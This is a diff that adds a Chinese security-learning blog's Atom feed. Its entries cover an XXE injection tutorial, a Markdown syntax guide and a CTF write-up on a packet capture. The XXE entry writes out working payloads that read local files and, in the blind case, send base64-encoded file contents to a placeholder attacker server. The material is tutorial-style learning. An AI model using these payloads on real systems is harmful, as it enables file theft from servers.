+        &lt;h1 id=&quot;搜索引擎搜集信息&quot;&gt;&lt;a href=&quot;#搜索引擎搜集信息&quot; class=&quot;headerlink&quot; title=&quot;搜索引擎搜集信息&quot;&gt;&lt;/a&gt;搜索引擎搜集信息&lt;/h1&gt;&lt;p&gt;我们可以使用搜索引擎自带的常用的一些高级搜索指令来帮助我们快速搜索到相关信息&lt;/p&gt;
+&lt;ol
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="-渗透测试 -新手入门" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>xxe攻击浅记</title>
+    <link href="http://yoursite.com/2018/01/27/xxe%E6%B5%85%E8%AE%B0/"/>
+    <id>http://yoursite.com/2018/01/27/xxe浅记/</id>
+    <published>2018-01-27T14:13:33.000Z</published>
+    <updated>2018-01-27T15:40:10.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="XXE基础知识"><a href="#XXE基础知识" class="headerlink" title="XXE基础知识"></a>XXE基础知识</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>即外部实体，如果从安全角度理解成XML External Entity attack 外部实体注入攻击。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p><h2 id="DTD-引用方式"><a href="#DTD-引用方式" class="headerlink" title="DTD 引用方式"></a>DTD 引用方式</h2><h3 id="DTD-内部声明"><a href="#DTD-内部声明" class="headerlink" title="DTD 内部声明"></a>DTD 内部声明</h3><p>&lt;!DOCTYPE 根元素 [元素声明]&gt;</p><h3 id="DTD-外部引用"><a href="#DTD-外部引用" class="headerlink" title="DTD 外部引用"></a>DTD 外部引用</h3><p>&lt;!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”&gt;</p><h3 id="引用公共DTD"><a href="#引用公共DTD" class="headerlink" title="引用公共DTD"></a>引用公共DTD</h3><p>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</p><h2 id="DTD-实体声明"><a href="#DTD-实体声明" class="headerlink" title="DTD 实体声明"></a>DTD 实体声明</h2><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><p>&lt;!ENTITY 实体名称 “实体的值”&gt;<br>示例:</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p><img src="/imagess/a1.png" alt="1"><br>注意:一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号。</p><h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><p>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;<br>外部引用可支持http，file等协议,具体内容如下:<br><img src="/imagess/a2.jpg" alt="2"><br>示例:</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  xxe SYSTEM &quot;file:///d:/a.txt&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><h3 id="参数实体声明"><a href="#参数实体声明" class="headerlink" title="参数实体声明"></a>参数实体声明</h3><p>&lt;!ENTITY % 实体名称 “实体的值”&gt;    or    &lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;<br>示例:</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  % xxe SYSTEM &quot;http://localhost/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt;</code></pre><p>外部evil.dtd中的内容</p><pre><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</code></pre><h3 id="引用公共实体"><a href="#引用公共实体" class="headerlink" title="引用公共实体"></a>引用公共实体</h3><p>&lt;!ENTITY 实体名称 PUBLIC “public_ID” “URI”&gt;</p><h1 id="XXE的利用方式"><a href="#XXE的利用方式" class="headerlink" title="XXE的利用方式"></a>XXE的利用方式</h1><h2 id="DTD的利用方式"><a href="#DTD的利用方式" class="headerlink" title="DTD的利用方式"></a>DTD的利用方式</h2><p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现<br>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><p>有回显的情况可以使用如下的两种方式进行XXE注入攻击</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt;</code></pre><p>外部evil.dtd中的内容。</p><pre><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</code></pre><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx</p><pre><code>&lt;!DOCTYPE updateProfile [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25</p><pre><code>&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM ‘http://xxx.xxx.xxx/?data=%file;’&gt;&quot;&gt;%all;</code></pre><p>有报错直接查看报错信息，无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;XXE基础知识&quot;&gt;&lt;a href=&quot;#XXE基础知识&quot; class=&quot;headerlink&quot; title=&quot;XXE基础知识&quot;&gt;&lt;/a&gt;XXE基础知识&lt;/h1&gt;&lt;h2 id=&quot;相关概念&quot;&gt;&lt;a href=&quot;#相关概念&quot; class=&quot;headerlink&quot; titl
+      
+    
+    </summary>
+    
+      <category term="XML" scheme="http://yoursite.com/categories/XML/"/>
+    
+    
+      <category term="新手入门" scheme="http://yoursite.com/tags/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/"/>
+    
+      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="xxe" scheme="http://yoursite.com/tags/xxe/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>markdown语法</title>
+    <link href="http://yoursite.com/2018/01/23/markdown%E8%AF%AD%E6%B3%95/"/>
+    <id>http://yoursite.com/2018/01/23/markdown语法/</id>
+    <published>2018-01-23T09:12:15.000Z</published>
+    <updated>2018-01-28T03:57:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>因为搭建这个个人博客，里面文章编辑需要相关的markdown的知识，所以这里记录一下，以后也可以随时翻阅。</p><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>markdown中的标题语法分为两类，类 Setext 和类 atx 形式。</p><ul><li><p>第一种形式是采用底线的写法，在标题内容的下端加入一些=(最高阶标题)或者-(第二阶标题),这里任意的=和-都可以。例如:</p><pre><code>这是最高阶标题=============这是第二阶标题--------------</code></pre><p>所达到的效果是这样的:</p><h1 id="这是最高阶标题"><a href="#这是最高阶标题" class="headerlink" title="这是最高阶标题"></a>这是最高阶标题</h1><h2 id="这是第二阶标题"><a href="#这是第二阶标题" class="headerlink" title="这是第二阶标题"></a>这是第二阶标题</h2></li><li><p>第二种形式是在标题内容的行首加入1到6个#(对应不同的6个阶级).例如:</p><pre><code># 这是第一阶标题 ### 这是第二阶标题 ##### 这是第三阶标题 ####### 这是第四阶标题 ######### 这是第五阶标题 ########### 这是第六阶标题 ######</code></pre><p>对应的效果:</p><h1 id="这是第一阶标题"><a href="#这是第一阶标题" class="headerlink" title="这是第一阶标题"></a>这是第一阶标题</h1><h2 id="这是第二阶标题-1"><a href="#这是第二阶标题-1" class="headerlink" title="这是第二阶标题"></a>这是第二阶标题</h2><h3 id="这是第三阶标题"><a href="#这是第三阶标题" class="headerlink" title="这是第三阶标题"></a>这是第三阶标题</h3><h4 id="这是第四阶标题"><a href="#这是第四阶标题" class="headerlink" title="这是第四阶标题"></a>这是第四阶标题</h4><h5 id="这是第五阶标题"><a href="#这是第五阶标题" class="headerlink" title="这是第五阶标题"></a>这是第五阶标题</h5><h6 id="这是第六阶标题"><a href="#这是第六阶标题" class="headerlink" title="这是第六阶标题"></a>这是第六阶标题</h6></li></ul><h1 id="区块引用"><a href="#区块引用" class="headerlink" title="区块引用"></a>区块引用</h1><p>Markdown 标记区块引用是使用类似 email 中用 &gt; 的引用方式,在每行的前面加上&gt;.例如:</p><pre><code>&gt;This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,&gt;consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.&gt;Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus</code></pre><p>对应的效果:</p><blockquote><p>This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,<br>consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.<br>Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus</p></blockquote><p>区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 &gt; ：</p><pre><code>&gt; This is the first level of quoting.&gt;&gt; &gt; This is nested blockquote.&gt;&gt; Back to the first level.</code></pre><blockquote><p>This is the first level of quoting.</p><blockquote><p>This is nested blockquote.</p></blockquote><p>Back to the first level.</p></blockquote><p>引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：</p><pre><code>&gt; ## 这是一个标题。&gt; &gt; 1.   这是第一行列表项。&gt; 2.   这是第二行列表项。&gt; &gt; 给出一些例子代码：&gt; &gt;     return shell_exec(&quot;echo $input | $markdown_script&quot;);</code></pre><blockquote><h2 id="这是一个标题。"><a href="#这是一个标题。" class="headerlink" title="这是一个标题。"></a>这是一个标题。</h2><ol><li>这是第一行列表项。</li><li>这是第二行列表项。</li></ol><p>给出一些例子代码：</p><pre><code>return shell_exec(&quot;echo $input | $markdown_script&quot;);</code></pre></blockquote><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>Markdown语法中分为有序列表和无序列表</p><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>无序列表使用星号、加号或是减号作为列表标记：</p><pre><code>*   Red       等同于    +    Red       等同于    -    Red     *   Green     等同于    +    Green     等同于    -    Green*   Blue      等同于    +    Blue      等同于    -    Blue</code></pre><ul><li>Red</li><li>Green</li><li>Blue</li></ul><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>有序列表则使用数字接着一个英文句点：</p><pre><code>1.  Bird2.  McHale3.  Parish</code></pre><ol><li>Bird</li><li>McHale</li><li>Parish</li></ol><h1 id="代码区块"><a href="#代码区块" class="headerlink" title="代码区块"></a>代码区块</h1><p>顾名思义就是显示原来代码的样子<br>要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如输入下列语句:</p><pre><code>这是一个普通段落：    这是一个代码区块</code></pre><p>这是一个普通段落：</p><pre><code>这是一个代码区块</code></pre><h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><pre><code>* * *********- - ----------------------------------------</code></pre><p>效果如下:</p><hr><h1 id="区段元素"><a href="#区段元素" class="headerlink" title="区段元素"></a>区段元素</h1><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>MarkDwon中链接的方式分为行内式和参考式两种形式</p><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>在行内式中链接文字用 [方括号] 来标记,并且在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如:</p><pre><code>This is [an example](https://www.baidu.com/ &quot;百度&quot;) inline link</code></pre><p>This is <a href="https://www.baidu.com/" title="百度" target="_blank" rel="noopener">an example</a> inline link<br>如果要链接到同主机的资源，可以使用相对路径</p><h3 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h3><p>参考式的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记<br>接着，在文件的任意处，你可以把这个标记的链接内容定义出来，例如:</p><pre><code>This is [an example][id] reference-style link.[id]: https://www.bilibili.com/  &quot;bilibili&quot;</code></pre><p>This is [an example][id] reference-style link.<br>[id]: <a href="https://www.bilibili.com/" target="_blank" rel="noopener">https://www.bilibili.com/</a>  “bilibili”<br>链接辨别标签可以有字母、数字、空白和标点符号，但是并不区分大小写，因此下面两个链接是一样的：</p><pre><code>[link text][a][link text][A]</code></pre><h2 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h2><p>这里*和_被作为强调的符号，被 * 或_ 包围的字词会被转成用 &lt;em> 标签包围，用两个 * 或 _ 包起来的话，则会被转成&lt;strong>，例如:</p><pre><code>*single asterisks*_single underscores_**double asterisks**__double underscores__</code></pre><p><em>single asterisks</em><br><em>single underscores</em><br><strong>double asterisks</strong><br><strong>double underscores</strong><br>当然强调也可以直接放在文字中间</p><pre><code>un*frigging*believable</code></pre><p>un<em>frigging</em>believable</p><h2 id="强调-1"><a href="#强调-1" class="headerlink" title="强调"></a>强调</h2><p>如果要标记一小段行内代码，你可以用反引号把它包起来（`），例如：</p><pre><code>Use the `printf()` function.</code></pre><p>Use the <code>printf()</code> function.</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>markdown也是用行内式和参考式来标记图片</p><h3 id="行内式-1"><a href="#行内式-1" class="headerlink" title="行内式"></a>行内式</h3><pre><code>![Alt text](/path/to/img.jpg &quot;Optional title&quot;)</code></pre><h3 id="行内式-2"><a href="#行内式-2" class="headerlink" title="行内式"></a>行内式</h3><pre><code>![Alt text][id][id]: url/to/image  &quot;Optional title attribute&quot;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;因为搭建这个个人博客，里面文章编辑需要相关的markdown的知识，所以这里记录一下，以后也可以随时翻阅。&lt;/p&gt;
+&lt;h1 id=&quot;标题&quot;&gt;&lt;a href=&quot;#标题&quot; class=&quot;headerlink&quot; title=&quot;标题&quot;&gt;&lt;/a&gt;标题&lt;/h1&gt;&lt;p&gt;markdown中
+      
+    
+    </summary>
+    
+      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="markdown" scheme="http://yoursite.com/tags/markdown/"/>
+    
+      <category term="新手入门" scheme="http://yoursite.com/tags/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2018年1月安恒杯杂项&lt;&lt;菜刀666&gt;&gt;题解</title>
+    <link href="http://yoursite.com/2018/01/21/2018%E5%B9%B41%E6%9C%88%E5%AE%89%E6%81%92%E6%9D%AF%E9%A2%98%E8%A7%A3/"/>
+    <id>http://yoursite.com/2018/01/21/2018年1月安恒杯题解/</id>
+    <published>2018-01-21T11:50:11.000Z</published>
+    <updated>2018-01-22T11:23:44.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="整体过程"><a href="#整体过程" class="headerlink" title="整体过程"></a>整体过程</h1><p>下载下来发现是一个抓包文件，用wireshark打开，先追踪一下TCP流，发现总有只有14个流，我们也就可以一个一个慢慢看过去。<br>看到第10个流的时候，发现了关键信息。<br><img src="/imagess/ctf1.png" alt="1"><br>PK是zip文件的文件头，所以我们这里需要把对应的十六进制编码全部放入winhex中，保存为zip文件<br><img src="/imagess/ctf2.png" alt="2"><br>打开这个文件，我们能看到里面存放着falg.txt,但是需要密码，上面的信息也提示我们需要找到正确的密码，否则随便输入的话，打开的flag.txt里面的内容会是乱码<br><img src="/imagess/ctf3.png" alt="3"><br>但是我们去哪找密码呢？？？<br>于是乎又回头再那些tcp流中仔细地寻找一下(这里找了好久…….),最终发现第8个流里面数据很大(所以截图就不截了),发现菜刀的执行命令参数中z2的数值很奇怪。<br>开头为FFD8FF，这是jpg的文件头，于是又将这些数据复制到winhex中，保存为jpg,吼吼吼，密码就在里面<br><img src="/imagess/ctf4.png" alt="4"><br>终于打开了flag.txt</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做完之后回头看看还是简单地，但是我找信息的能力太差了，花了好长时间，难过(；′⌒`)</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;整体过程&quot;&gt;&lt;a href=&quot;#整体过程&quot; class=&quot;headerlink&quot; title=&quot;整体过程&quot;&gt;&lt;/a&gt;整体过程&lt;/h1&gt;&lt;p&gt;下载下来发现是一个抓包文件，用wireshark打开，先追踪一下TCP流，发现总有只有14个流，我们也就可以一个一个慢慢看过
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+  </entry>
+  
+</feed>
